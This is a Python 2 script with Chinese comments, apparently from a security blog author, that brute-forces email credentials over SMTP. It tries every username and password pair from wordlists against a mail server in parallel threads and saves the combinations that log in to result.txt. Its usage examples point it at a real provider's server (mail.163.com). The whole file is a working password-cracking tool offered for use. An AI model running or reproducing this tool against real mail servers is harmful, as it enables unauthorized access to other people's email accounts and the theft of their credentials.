#! /usr/bin/env python
# coding:utf-8
# --------------------------------------------------
# file_name: smtp_scan.py
# author: secsky
# --------------------------------------------------

import os
import sys
import getopt
import smtplib
import time
from threading import Thread

def get_user_password(smtp_server,user_list_txt,pwd_list_txt):
    open_user_file = open(user_list_txt,'r')
    open_pwd_file = open(pwd_list_txt,'r')
    user_list = [line.strip() for line in open_user_file]
    pwd_list = [line1.strip() for line1 in open_pwd_file]
    thread_list = []
    open_user_file.close()
    open_pwd_file.close()
    #遍历数组，提取用户名和密码
    for i in range(0,len(user_list),1):
        for j in range(0,len(pwd_list),1):
            t = Thread(target=smtp_auth,args=(smtp_server,user_list[i],pwd_list[j]))
            t.start()
            thread_list.append(t)
            time.sleep(0.1)
    for x in thread_list:
        x.join()

def smtp_auth(smtp_server,user,password):
    #定义返回值
    result = False
    server = smtplib.SMTP(smtp_server)
    try:
        server.login(user,password)
        result = True
    except:
        pass
    finally:
        server.quit()
    #如果result返回值等于True，说明登录成功，将相应帐号密码保存至文件
    if result == True:
         info = "用户名：" + user + "|" + "密码：" + password + '\n'
         open_result_file.writelines(info)

#获取命令行参数方法
def get_args():
    dic = {'smtp_server':'','user':'','pwd':'','user_list':'','pwd_list':''}
    try:
        options,args = getopt.getopt(sys.argv[1:],"hs:u:p:U:P:",["help","server=","user=","password=","USER=","PASSWORD="])
    except getopt.GetoptError:
        sys.exit()
    #遍历获取参数
    if len(options) < 1:
        usage()
        sys.exit()
    for name,value in options:
        if name == '-h':
            usage()
            sys.exit()
        elif name == '-s' and len(value) > 5:
            dic['smtp_server'] = value
        elif name == '-u' and len(value) > 3:
            dic['user'] = value
        elif name == '-p' and len(value) > 5:
            dic['pwd'] = value
        elif name == '-U' and len(value) > 3:
            dic['user_list'] = value
        elif name == '-P' and len(value) > 3:
            dic['pwd_list'] = value
    return dic

#打印使用帮助方法
def usage():
    print '+' + '-' * 80 + '+'
    print '\t\t\t  FileName: 邮箱密码破解工具 V1.0'
    print '\t\t\t  Blog: http://www.secsky.cn/'
    print '\t\t\t  Code BY: secsky'
    print '+' + '-' * 80 + '+'
    print 'Usage:'
    print '\tsmtp_scan.py [-s smtp_server] [-u user_name] [-p password]'
    print '\tsmtp_scan.py [-s smtp_server] [-U user_list.txt] [-P password.txt]'
    print 'Options:'
    print '\t-s smtp_server    SMTP服务器地址'
    print '\t-u user_name      用户名'
    print '\t-p password       密码'
    print '\t-U user_list.txt  用户名字典'
    print '\t-P password.txt   密码字典'
    print 'Examples:'
    print '\t1. smtp_scan.py -s mail.163.com -u zhangsan@163.com -p 123456'
    print '\t2. smtp_scan.py -s mail.163.com -U users.txt -P password.txt'

if __name__ == '__main__':
    start_time = int(time.time())
    result_file = "result.txt"
    open_result_file = open(result_file,'w')
    dic = get_args()
    if dic['smtp_server'] != '' and  dic['user'] != '' and dic['pwd'] != '':
        print "正在全力破解中，请耐心等待... ..."
        smtp_auth(dic['smtp_server'],dic['user'],dic['pwd'])
    elif dic['smtp_server'] != '' and dic['user_list'] != '' and dic['pwd_list'] != '':
        print "正在全力破解中，请耐心等待... ..."
        get_user_password(dic['smtp_server'],dic['user_list'],dic['pwd_list'])
    else:
        usage()
        sys.exit()
    open_result_file.close()
    end_time = int(time.time())
    count_time = end_time - start_time
    print "全部密码破解完成，共用时" + str(count_time) + "秒"
    print "请在result.txt中查看破解结果！"